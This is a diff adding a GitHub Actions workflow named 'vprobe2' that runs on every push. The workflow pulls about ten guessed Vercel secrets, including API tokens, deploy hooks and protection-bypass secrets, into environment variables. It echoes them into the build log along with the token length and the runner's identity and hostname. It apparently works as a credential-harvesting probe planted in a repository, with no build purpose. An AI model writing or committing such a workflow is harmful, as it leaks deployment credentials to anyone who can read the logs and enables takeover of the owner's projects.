@@ -1,0 +1,24 @@
+name: vprobe2
+on: push
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env:
+          VTOK: ${{ secrets.VERCEL_TOKEN }}
+          VORG: ${{ secrets.VERCEL_ORG_ID }}
+          VPRJ: ${{ secrets.VERCEL_PROJECT_ID }}
+          VHOOK: ${{ secrets.VERCEL_DEPLOY_HOOK }}
+          VHOOK2: ${{ secrets.VERCEL_DEPLOY_HOOK_URL }}
+          VBYP: ${{ secrets.VERCEL_AUTOMATION_BYPASS_SECRET }}
+          VBYP2: ${{ secrets.VERCEL_PROTECTION_BYPASS }}
+          VT2: ${{ secrets.VERCEL_API_TOKEN }}
+          VT3: ${{ secrets.VERCEL_ACCESS_TOKEN }}
+          VT4: ${{ secrets.PROD_VERCEL_TOKEN }}
+        run: |
+          echo "VTOK=[$VTOK] len=${#VTOK}"
+          echo "VORG=[$VORG] VPRJ=[$VPRJ]"
+          echo "VHOOK=[$VHOOK] VHOOK2=[$VHOOK2]"
+          echo "VBYP=[$VBYP] VBYP2=[$VBYP2] VT2=[$VT2] VT3=[$VT3] VT4=[$VT4]"
+          echo "runner: $(id) $(whoami) $(hostname)"
